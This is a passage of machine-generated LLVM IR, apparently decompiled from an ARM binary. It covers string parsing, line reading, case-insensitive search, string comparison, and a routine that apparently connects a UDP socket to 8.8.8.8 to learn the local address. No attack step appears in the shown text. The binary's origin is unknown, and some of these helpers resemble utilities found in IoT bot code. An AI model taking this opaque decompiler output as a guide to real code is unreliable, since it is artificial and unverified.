  br i1 %v3_12e5c, label %dec_label_pc_12eb8, label %dec_label_pc_12e60

dec_label_pc_12e60:                               ; preds = %bb54
  %v2_12e60 = icmp eq i32 %v0_12e60, 0
  %. = select i1 %v2_12e60, i32 87, i32 55
  %v2_12e6c = sub i32 %v1_12e6c, %.
  br label %dec_label_pc_12e70

dec_label_pc_12e70:                               ; preds = %dec_label_pc_12e2c, %dec_label_pc_12e60
  %v0_12e8434 = phi i32 [ %v1_12e40, %dec_label_pc_12e2c ], [ %., %dec_label_pc_12e60 ]
  %v3_12ea812 = phi i32 [ %v1_12e3c, %dec_label_pc_12e2c ], [ %v2_12e6c, %dec_label_pc_12e60 ]
  %v1_12e70 = load i32, i32* %r6.global-to-local, align 4
  %v6_12e74 = icmp slt i32 %v3_12ea812, %v1_12e70
  br i1 %v6_12e74, label %dec_label_pc_12e78, label %dec_label_pc_12eb8

dec_label_pc_12e78:                               ; preds = %dec_label_pc_12e70
  %v3_12e78 = icmp uge i32 %v2_12ea811, %v0_12e1c
  %v9_12e78 = icmp eq i32 %v2_12ea811, %v0_12e1c
  %v2_12e7c = xor i1 %v3_12e78, true
  %v3_12e7c = or i1 %v9_12e78, %v2_12e7c
  br i1 %v3_12e7c, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_12e78
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_12e78, %bb57
  %v0_12e8433 = phi i32 [ %v0_12e8434, %dec_label_pc_12e78 ], [ 0, %bb57 ]
  %v2_12e80 = xor i1 %v9_12e78, true
  %v3_12e80 = and i1 %v3_12e78, %v2_12e80
  br i1 %v3_12e80, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v0_12e84 = phi i32 [ %v0_12e8433, %bb58 ], [ 1, %bb59 ]
  %tmp72 = icmp slt i32 %v1_12e84, 0
  %v4_12e84 = zext i1 %tmp72 to i32
  %v5_12e84 = or i32 %v0_12e84, %v4_12e84
  %v7_12e84 = icmp eq i32 %v5_12e84, 0
  br i1 %v7_12e84, label %dec_label_pc_12e90, label %.thread8

dec_label_pc_12e90:                               ; preds = %bb60
  %v1_12e9c = load i32, i32* %r8.global-to-local, align 4
  %v7_12ea0 = icmp sgt i32 %v3_12ea812, %v1_12e9c
  br i1 %v7_12ea0, label %bb63, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_12e90
  br label %bb64

bb63:                                             ; preds = %dec_label_pc_12e90
  %v2_12ea4 = icmp eq i1 %v9_12e78, false
  br i1 %v2_12ea4, label %bb64, label %.thread8

bb64:                                             ; preds = %bb63, %.thread5
  %v4_12ea813 = mul i32 %v1_12e70, %v2_12ea811
  %v5_12ea814 = add i32 %v4_12ea813, %v3_12ea812
  br label %.thread8

.thread8:                                         ; preds = %bb63, %bb60, %bb64
  %v1_12ec426 = phi i32 [ %v2_12ea811, %bb63 ], [ %v2_12ea811, %bb60 ], [ %v5_12ea814, %bb64 ]
  %v0_12eb824 = phi i32 [ -1, %bb63 ], [ -1, %bb60 ], [ 1, %bb64 ]
  %v0_12eb0 = load i32, i32* %r5.global-to-local, align 4
  %v1_12eb0 = inttoptr i32 %v0_12eb0 to i8*
  %v2_12eb0 = load i8, i8* %v1_12eb0, align 1
  %v3_12eb0 = zext i8 %v2_12eb0 to i32
  store i32 %v3_12eb0, i32* %r4.global-to-local, align 4
  %v5_12eb0 = add i32 %v0_12eb0, 1
  store i32 %v5_12eb0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e2c

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12e70, %bb54
  %v1_12eb8 = icmp slt i32 %v1_12e84, 0
  %v0_12edc = load i32, i32* %sl.global-to-local, align 4
  %v2_12edc = icmp eq i32 %v0_12edc, 0
  br i1 %v1_12eb8, label %dec_label_pc_12edc, label %dec_label_pc_12ec0

dec_label_pc_12ec0:                               ; preds = %dec_label_pc_12eb8
  br i1 %v2_12edc, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_12ec0
  %v2_12ec4 = sub i32 0, %v2_12ea811
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_12ec0, %bb65
  %v23_12ec8 = phi i32 [ %v2_12ea811, %dec_label_pc_12ec0 ], [ %v2_12ec4, %bb65 ]
  %v2_12ec8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12ec8, i32* @r4, align 4
  ret i32 %v23_12ec8

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_12dec
  %v1_12ecc = inttoptr i32 %v5_12dcc to i8*
  %v2_12ecc = load i8, i8* %v1_12ecc, align 1
  %v3_12ecc = zext i8 %v2_12ecc to i32
  store i32 %v3_12ecc, i32* %r4.global-to-local, align 4
  %v5_12ecc = add i32 %v0_12dcc, 2
  store i32 %v5_12ecc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e04

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12eb8
  %.70 = select i1 %v2_12edc, i32 2147483647, i32 -2147483648
  %v2_12ee8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12ee8, i32* @r4, align 4
  ret i32 %.70

; uselistorder directives
  uselistorder i32 %v3_12eb0, { 1, 0 }
  uselistorder i1 %v9_12e78, { 1, 0, 2 }
  uselistorder i1 %v3_12e78, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_12e48, { 1, 2, 0 }
  uselistorder i1 %v2_12e48, { 1, 0, 2 }
  uselistorder i32 %v1_12e2c, { 1, 2, 0 }
  uselistorder i32 %v1_12e6c, { 1, 2, 0 }
  uselistorder i32 %v1_12e84, { 1, 0 }
  uselistorder i32 %v2_12ea811, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_12e1c, { 1, 0, 2 }
  uselistorder i32 %v5_12dcc, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v3_12dcc, { 1, 0 }
  uselistorder i32 %v0_12dcc, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i8 9, { 7, 0, 5, 1, 2, 6, 3, 4 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %dec_label_pc_12e70, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_12e04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12dcc, { 1, 2, 0, 3 }
}

define i32 @function_12eec(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12eec:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12eec = load i32, i32* @r4, align 4
  store i32 %v3_12eec, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12f04

dec_label_pc_12f04:                               ; preds = %dec_label_pc_12f30.dec_label_pc_12f04_crit_edge, %dec_label_pc_12eec
  %v0_12f08 = phi i32 [ %v0_12f08.pre, %dec_label_pc_12f30.dec_label_pc_12f04_crit_edge ], [ %arg3, %dec_label_pc_12eec ]
  %v0_12f04 = phi i32 [ %v1_12f1c, %dec_label_pc_12f30.dec_label_pc_12f04_crit_edge ], [ %tmp, %dec_label_pc_12eec ]
  %tmp12 = inttoptr i32 %v0_12f04 to i32*
  %v5_12f10 = call i32 @function_1381c(i32 %v0_12f08, i32* %tmp12, i32 1)
  %v7_12f14 = icmp eq i32 %v5_12f10, 1
  %v0_12f18 = load i32, i32* @r4, align 4
  %v1_12f1c = add i32 %v0_12f18, 1
  store i32 %v1_12f1c, i32* @r4, align 4
  %v0_12f24 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_12f14, label %dec_label_pc_12f24, label %dec_label_pc_12f3c

dec_label_pc_12f24:                               ; preds = %dec_label_pc_12f04
  %v1_12f24 = add i32 %v0_12f24, 1
  store i32 %v1_12f24, i32* %r5.global-to-local, align 4
  %v0_12f28 = load i32, i32* %r7.global-to-local, align 4
  %v7_12f2c = icmp sgt i32 %v0_12f28, %v1_12f24
  br i1 %v7_12f2c, label %dec_label_pc_12f30, label %dec_label_pc_12f3c

dec_label_pc_12f30:                               ; preds = %dec_label_pc_12f24
  %v1_12f30 = inttoptr i32 %v0_12f18 to i8*
  %v2_12f30 = load i8, i8* %v1_12f30, align 1
  %v7_12f34 = icmp eq i8 %v2_12f30, 10
  br i1 %v7_12f34, label %dec_label_pc_12f3c, label %dec_label_pc_12f30.dec_label_pc_12f04_crit_edge

dec_label_pc_12f30.dec_label_pc_12f04_crit_edge:  ; preds = %dec_label_pc_12f30
  %v0_12f08.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12f04

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12f04, %dec_label_pc_12f30, %dec_label_pc_12f24
  %v0_12f3c = phi i32 [ %v1_12f24, %dec_label_pc_12f30 ], [ %v1_12f24, %dec_label_pc_12f24 ], [ %v0_12f24, %dec_label_pc_12f04 ]
  %v2_12f3c = icmp eq i32 %v0_12f3c, 0
  %v1_12f40 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_12f3c, i32 0, i32 %v1_12f40
  %v2_12f48 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12f48, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_12f1c, { 1, 0 }
  uselistorder i8 10, { 8, 1, 0, 9, 7, 10, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @function_1381c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12f3c, { 1, 2, 0 }
}

define i32 @function_12f4c() local_unnamed_addr {
dec_label_pc_12f4c:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12f4c = load i32, i32* @r4, align 4
  store i32 16, i32* @r4, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_12f5c = call i32 @function_13c28()
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12f64 = inttoptr i32 %v0_12f5c to i32*
  store i32 0, i32* %v2_12f64, align 4
  %v0_12f70 = load i32, i32* %r6.global-to-local, align 4
  %v3_12f74 = call i32 @function_13f50(i32 2, i32 2, i32 %v0_12f70)
  %v7_12f80 = icmp eq i32 %v3_12f74, -1
  store i32 %v3_12f74, i32* %r5.global-to-local, align 4
  %v2_12f8c = load i32, i32* @r4, align 4
  br i1 %v7_12f80, label %dec_label_pc_12fdc, label %dec_label_pc_12fa0

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f4c
  %v7_12f8c = shl i32 2056, %v2_12f8c
  %v8_12f8c = or i32 %v7_12f8c, 2056
  store i32 2, i32* %stack_var_-40, align 4
  %v3_12fbc = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_12fbc = call i32 @function_13dac(i32 %v3_12f74, %sockaddr* %v3_12fbc, i32 %v2_12f8c)
  %v2_12fc4 = ptrtoint i32* %stack_var_-24 to i32
  %v0_12fc8 = load i32, i32* %r5.global-to-local, align 4
  %v4_12fcc = call i32 @function_13dd8(i32 %v0_12fc8, %sockaddr* %v3_12fbc, i32 %v2_12fc4)
  %v1_12fd4 = call i32 @function_13654(i32 %v0_12fc8)
  br label %dec_label_pc_12fdc

dec_label_pc_12fdc:                               ; preds = %dec_label_pc_12f4c, %dec_label_pc_12fa0
  %v0_12fdc = phi i32 [ %v0_12f70, %dec_label_pc_12f4c ], [ %v8_12f8c, %dec_label_pc_12fa0 ]
  store i32 %v3_12f4c, i32* @r4, align 4
  ret i32 %v0_12fdc

; uselistorder directives
  uselistorder i32 %v3_12f74, { 1, 2, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_13dac, { 6, 0, 7, 1, 5, 2, 3, 4, 8 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_13f50, { 4, 19, 2, 3, 18, 6, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 5, 0 }
  uselistorder label %dec_label_pc_12fdc, { 1, 0 }
}

define i32 @function_12fe8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12fe8:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_12fec = load i8, i8* %tmp, align 1
  %v2_12ff0 = icmp eq i8 %v3_12fec, 0
  br i1 %v2_12ff0, label %bb, label %dec_label_pc_13004

bb:                                               ; preds = %dec_label_pc_12fe8
  %v4_12fec = zext i8 %v3_12fec to i32
  br label %dec_label_pc_13018

dec_label_pc_13004:                               ; preds = %dec_label_pc_12fe8
  br label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %dec_label_pc_13008, %dec_label_pc_13004
  %v0_13008 = phi i32 [ %v1_13008, %dec_label_pc_13008 ], [ 0, %dec_label_pc_13004 ]
  %v1_13008 = add i32 %v0_13008, 1
  %v2_1300c = add i32 %v1_13008, %arg2
  %v3_1300c = inttoptr i32 %v2_1300c to i8*
  %v4_1300c = load i8, i8* %v3_1300c, align 1
  %v2_13010 = icmp eq i8 %v4_1300c, 0
  br i1 %v2_13010, label %dec_label_pc_13018, label %dec_label_pc_13008

dec_label_pc_13018:                               ; preds = %dec_label_pc_13008, %bb
  %v0_1305c18 = phi i32 [ %v4_12fec, %bb ], [ %v1_13008, %dec_label_pc_13008 ]
  %v0_130201 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_130201, 1
  br i1 %tmp27, label %dec_label_pc_1306c, label %dec_label_pc_1302c

dec_label_pc_1302c:                               ; preds = %dec_label_pc_13018, %dec_label_pc_13020.backedge
  %v0_13024.in = phi i32 [ %v0_13024, %dec_label_pc_13020.backedge ], [ %v0_130201, %dec_label_pc_13018 ]
  %v0_13050 = phi i32 [ %v1_13050., %dec_label_pc_13020.backedge ], [ 0, %dec_label_pc_13018 ]
  %v0_1302c = phi i32 [ %v5_1302c, %dec_label_pc_13020.backedge ], [ %tmp20, %dec_label_pc_13018 ]
  %v0_13024 = add i32 %v0_13024.in, -1
  %v1_1302c = inttoptr i32 %v0_1302c to i8*
  %v2_1302c = load i8, i8* %v1_1302c, align 1
  %v3_1302c = zext i8 %v2_1302c to i32
  store i32 %v3_1302c, i32* @lr, align 4
  %v5_1302c = add i32 %v0_1302c, 1
  %v2_13030 = add i32 %v0_13050, %arg2
  %v3_13030 = inttoptr i32 %v2_13030 to i8*
  %v4_13030 = load i8, i8* %v3_13030, align 1
  %v6_13030 = zext i8 %v4_13030 to i32
  %v1_13034 = add nsw i32 %v3_1302c, -65
  %v1_13038 = add nsw i32 %v6_13030, -65
  %tmp35 = icmp ult i32 %v1_13034, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_1302c
  %v5_13040 = or i32 %v3_1302c, 96
  store i32 %v5_13040, i32* @lr, align 4
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_1302c, %bb28
  %v0_1304c = phi i32 [ %v3_1302c, %dec_label_pc_1302c ], [ %v5_13040, %bb28 ]
  %tmp36 = icmp ult i32 %v1_13038, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_13048 = or i32 %v6_13030, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_1304c = phi i32 [ %v6_13030, %bb29 ], [ %v5_13048, %bb30 ]
  %v9_1304c = icmp eq i32 %v0_1304c, %v1_1304c
  %v1_13050 = add i32 %v0_13050, 1
  %v1_13050. = select i1 %v9_1304c, i32 %v1_13050, i32 0
  br i1 %v9_1304c, label %dec_label_pc_1305c, label %dec_label_pc_13020.backedge

dec_label_pc_13020.backedge:                      ; preds = %bb31, %dec_label_pc_1305c
  %tmp32 = icmp slt i32 %v0_13024, 1
  br i1 %tmp32, label %dec_label_pc_1306c, label %dec_label_pc_1302c

dec_label_pc_1305c:                               ; preds = %bb31
  %v9_1305c = icmp eq i32 %v0_1305c18, %v1_13050.
  br i1 %v9_1305c, label %dec_label_pc_13064, label %dec_label_pc_13020.backedge

dec_label_pc_13064:                               ; preds = %dec_label_pc_1305c
  %v2_13064 = sub i32 %v5_1302c, %tmp20
  ret i32 %v2_13064

dec_label_pc_1306c:                               ; preds = %dec_label_pc_13020.backedge, %dec_label_pc_13018
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_13050., { 1, 0 }
  uselistorder i32 %v0_1302c, { 1, 0 }
  uselistorder i32 %v0_13050, { 1, 0 }
  uselistorder i8 %v3_12fec, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder label %dec_label_pc_13020.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_1302c, { 1, 0 }
}

define i32 @function_13074(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13074:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13074 = load i8, i8* %arg1, align 1
  %v2_13078 = icmp eq i8 %v2_13074, 0
  br i1 %v2_13078, label %bb, label %dec_label_pc_13084

bb:                                               ; preds = %dec_label_pc_13074
  %v3_13074 = zext i8 %v2_13074 to i32
  br label %dec_label_pc_13098

dec_label_pc_13084:                               ; preds = %dec_label_pc_13074
  br label %dec_label_pc_13088

dec_label_pc_13088:                               ; preds = %dec_label_pc_13088, %dec_label_pc_13084
  %v0_13088 = phi i32 [ %v1_13088, %dec_label_pc_13088 ], [ 0, %dec_label_pc_13084 ]
  %v1_13088 = add i32 %v0_13088, 1
  %v2_1308c = add i32 %v1_13088, %tmp
  %v3_1308c = inttoptr i32 %v2_1308c to i8*
  %v4_1308c = load i8, i8* %v3_1308c, align 1
  %v2_13090 = icmp eq i8 %v4_1308c, 0
  br i1 %v2_13090, label %dec_label_pc_13098, label %dec_label_pc_13088

dec_label_pc_13098:                               ; preds = %dec_label_pc_13088, %bb
  %v1_130bc = phi i32 [ %v3_13074, %bb ], [ %v1_13088, %dec_label_pc_13088 ]
  %v1_13098 = inttoptr i32 %arg2 to i8*
  %v2_13098 = load i8, i8* %v1_13098, align 1
  %v3_13098 = zext i8 %v2_13098 to i32
  %v2_1309c = icmp eq i8 %v2_13098, 0
  br i1 %v2_1309c, label %bb22, label %dec_label_pc_130a8

bb22:                                             ; preds = %dec_label_pc_13098
  store i32 %v3_13098, i32* @r2, align 4
  br label %dec_label_pc_130bc

dec_label_pc_130a8:                               ; preds = %dec_label_pc_13098
  br label %dec_label_pc_130ac

dec_label_pc_130ac:                               ; preds = %dec_label_pc_130ac, %dec_label_pc_130a8
  %v0_130ac = phi i32 [ %v1_130ac, %dec_label_pc_130ac ], [ 0, %dec_label_pc_130a8 ]
  %v1_130ac = add i32 %v0_130ac, 1
  store i32 %v1_130ac, i32* @r2, align 4
  %v2_130b0 = add i32 %v1_130ac, %arg2
  %v3_130b0 = inttoptr i32 %v2_130b0 to i8*
  %v4_130b0 = load i8, i8* %v3_130b0, align 1
  %v2_130b4 = icmp eq i8 %v4_130b0, 0
  br i1 %v2_130b4, label %dec_label_pc_130bc, label %dec_label_pc_130ac

dec_label_pc_130bc:                               ; preds = %dec_label_pc_130ac, %bb22
  %v0_130e84 = phi i32 [ %v3_13098, %bb22 ], [ %v1_130ac, %dec_label_pc_130ac ]
  %v9_130bc = icmp eq i32 %v0_130e84, %v1_130bc
  br i1 %v9_130bc, label %dec_label_pc_130e8.preheader, label %dec_label_pc_130c8

dec_label_pc_130e8.preheader:                     ; preds = %dec_label_pc_130bc
  %v2_130e86 = icmp eq i32 %v1_130bc, 0
  br i1 %v2_130e86, label %dec_label_pc_130f0, label %dec_label_pc_130d0

dec_label_pc_130c8:                               ; preds = %dec_label_pc_130d0, %dec_label_pc_130bc
  ret i32 0

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130e0, %dec_label_pc_130e8.preheader
  %v0_130e8.in = phi i32 [ %v0_130e8, %dec_label_pc_130e0 ], [ %v1_130bc, %dec_label_pc_130e8.preheader ]
  %v0_130e4 = phi i32 [ %v1_130e4, %dec_label_pc_130e0 ], [ %arg2, %dec_label_pc_130e8.preheader ]
  %v0_130e0 = phi i32 [ %v1_130e0, %dec_label_pc_130e0 ], [ %tmp, %dec_label_pc_130e8.preheader ]
  %v0_130e8 = add i32 %v0_130e8.in, -1
  %v1_130d0 = inttoptr i32 %v0_130e0 to i8*
  %v2_130d0 = load i8, i8* %v1_130d0, align 1
  %v3_130d0 = zext i8 %v2_130d0 to i32
  store i32 %v3_130d0, i32* @r2, align 4
  %v1_130d4 = inttoptr i32 %v0_130e4 to i8*
  %v2_130d4 = load i8, i8* %v1_130d4, align 1
  %v9_130d8 = icmp eq i8 %v2_130d0, %v2_130d4
  br i1 %v9_130d8, label %dec_label_pc_130e0, label %dec_label_pc_130c8

dec_label_pc_130e0:                               ; preds = %dec_label_pc_130d0
  %v1_130e0 = add i32 %v0_130e0, 1
  %v1_130e4 = add i32 %v0_130e4, 1
  %v2_130e8 = icmp eq i32 %v0_130e8, 0
  br i1 %v2_130e8, label %dec_label_pc_130f0, label %dec_label_pc_130d0

dec_label_pc_130f0:                               ; preds = %dec_label_pc_130e0, %dec_label_pc_130e8.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_130ac, { 0, 1, 3, 2 }
  uselistorder i8 %v2_13074, { 1, 0 }
}

define i32 @function_130f8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_130f8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_130fc = load i8, i8* %arg1, align 1
  %v2_13100 = icmp eq i8 %v2_130fc, 0
  %v0_13104 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_13100, label %bb, label %dec_label_pc_13110

bb:                                               ; preds = %dec_label_pc_130f8
  %v3_130fc = zext i8 %v2_130fc to i32
  br label %dec_label_pc_13124

dec_label_pc_13110:                               ; preds = %dec_label_pc_130f8
  br label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %dec_label_pc_13114, %dec_label_pc_13110
  %v0_13114 = phi i32 [ %v1_13114, %dec_label_pc_13114 ], [ 0, %dec_label_pc_13110 ]
  %v1_13114 = add i32 %v0_13114, 1
  %v2_13118 = add i32 %v1_13114, %tmp
  %v3_13118 = inttoptr i32 %v2_13118 to i8*
  %v4_13118 = load i8, i8* %v3_13118, align 1
  %v2_1311c = icmp eq i8 %v4_13118, 0
  br i1 %v2_1311c, label %dec_label_pc_13124, label %dec_label_pc_13114

dec_label_pc_13124:                               ; preds = %dec_label_pc_13114, %bb
  %v9_1314c = phi i32 [ %v3_130fc, %bb ], [ %v1_13114, %dec_label_pc_13114 ]
  %v0_13124 = load i32, i32* %r1.global-to-local, align 4
  %v1_13124 = inttoptr i32 %v0_13124 to i8*
  %v2_13124 = load i8, i8* %v1_13124, align 1
  %v3_13124 = zext i8 %v2_13124 to i32
  %v2_13128 = icmp eq i8 %v2_13124, 0
  br i1 %v2_13128, label %bb26, label %dec_label_pc_13134

bb26:                                             ; preds = %dec_label_pc_13124
  store i32 %v3_13124, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13148

dec_label_pc_13134:                               ; preds = %dec_label_pc_13124
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %dec_label_pc_13138, %dec_label_pc_13134
  %v0_13138 = phi i32 [ %v1_13138, %dec_label_pc_13138 ], [ 0, %dec_label_pc_13134 ]
  %v1_13138 = add i32 %v0_13138, 1
  store i32 %v1_13138, i32* %r2.global-to-local, align 4
  %v2_1313c = add i32 %v1_13138, %v0_13124
  %v3_1313c = inttoptr i32 %v2_1313c to i8*
  %v4_1313c = load i8, i8* %v3_1313c, align 1
  %v2_13140 = icmp eq i8 %v4_1313c, 0
  br i1 %v2_13140, label %dec_label_pc_13148, label %dec_label_pc_13138

dec_label_pc_13148:                               ; preds = %dec_label_pc_13138, %bb26
  %v1_13148 = phi i32 [ %v3_13124, %bb26 ], [ %v1_13138, %dec_label_pc_13138 ]
  %v2_13148 = sub i32 %v0_13104, %v1_13148
  %v4_13148 = xor i32 %v1_13148, %v0_13104
  %v5_13148 = xor i32 %v2_13148, %v0_13104
  %v6_13148 = and i32 %v5_13148, %v4_13148
  %v7_1314c = icmp sgt i32 %v0_13104, %v1_13148
  br i1 %v7_1314c, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_13148
  %v10_1314c = sub i32 %v0_13104, %v9_1314c
  %v12_1314c = xor i32 %v9_1314c, %v0_13104
  %v13_1314c = xor i32 %v10_1314c, %v0_13104
  %v14_1314c = and i32 %v13_1314c, %v12_1314c
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_13148, %bb27
  %v2_13150.in = phi i32 [ %v6_13148, %dec_label_pc_13148 ], [ %v14_1314c, %bb27 ]
  %v1_13150.in = phi i32 [ %v2_13148, %dec_label_pc_13148 ], [ %v10_1314c, %bb27 ]
  %v1_13148.pn = phi i32 [ %v1_13148, %dec_label_pc_13148 ], [ %v9_1314c, %bb27 ]
  %v0_13150 = icmp eq i32 %v0_13104, %v1_13148.pn
  %v1_13150 = icmp slt i32 %v1_13150.in, 0
  %v2_13150 = icmp slt i32 %v2_13150.in, 0
  %v3_13150 = xor i1 %v2_13150, %v1_13150
  %v4_13150 = or i1 %v0_13150, %v3_13150
  br i1 %v4_13150, label %dec_label_pc_13160.preheader, label %dec_label_pc_13178

dec_label_pc_13160.preheader:                     ; preds = %bb28
  %v2_131605 = icmp eq i32 %v0_13104, 0
  br i1 %v2_131605, label %dec_label_pc_13180, label %dec_label_pc_13168

dec_label_pc_13158:                               ; preds = %dec_label_pc_13168
  %v1_13158 = add i32 %v0_13158, 1
  %v1_1315c = add i32 %v0_1315c, 1
  store i32 %v1_1315c, i32* %r1.global-to-local, align 4
  %v2_13160 = icmp eq i32 %v0_13160, 0
  br i1 %v2_13160, label %dec_label_pc_13180, label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %dec_label_pc_13158, %dec_label_pc_13160.preheader
  %v0_13160.in = phi i32 [ %v0_13160, %dec_label_pc_13158 ], [ %v0_13104, %dec_label_pc_13160.preheader ]
  %v0_1315c = phi i32 [ %v1_1315c, %dec_label_pc_13158 ], [ %v0_13124, %dec_label_pc_13160.preheader ]
  %v0_13158 = phi i32 [ %v1_13158, %dec_label_pc_13158 ], [ %tmp, %dec_label_pc_13160.preheader ]
  %v0_13160 = add i32 %v0_13160.in, -1
  %v1_13168 = inttoptr i32 %v0_13158 to i8*
  %v2_13168 = load i8, i8* %v1_13168, align 1
  %v3_13168 = zext i8 %v2_13168 to i32
  store i32 %v3_13168, i32* %r2.global-to-local, align 4
  %v1_1316c = inttoptr i32 %v0_1315c to i8*
  %v2_1316c = load i8, i8* %v1_1316c, align 1
  %v9_13170 = icmp eq i8 %v2_13168, %v2_1316c
  br i1 %v9_13170, label %dec_label_pc_13158, label %dec_label_pc_13178

dec_label_pc_13178:                               ; preds = %dec_label_pc_13168, %bb28
  ret i32 0

dec_label_pc_13180:                               ; preds = %dec_label_pc_13158, %dec_label_pc_13160.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_13158, { 1, 0 }
  uselistorder i32 %v0_1315c, { 1, 0 }
  uselistorder i32 %v1_13148, { 0, 3, 1, 2 }
  uselistorder i32 %v1_13138, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13104, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_130fc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_13188(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13188:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13188 = load i32, i32* @r4, align 4
  store i32 %v3_13188, i32* %stack_var_-28, align 4
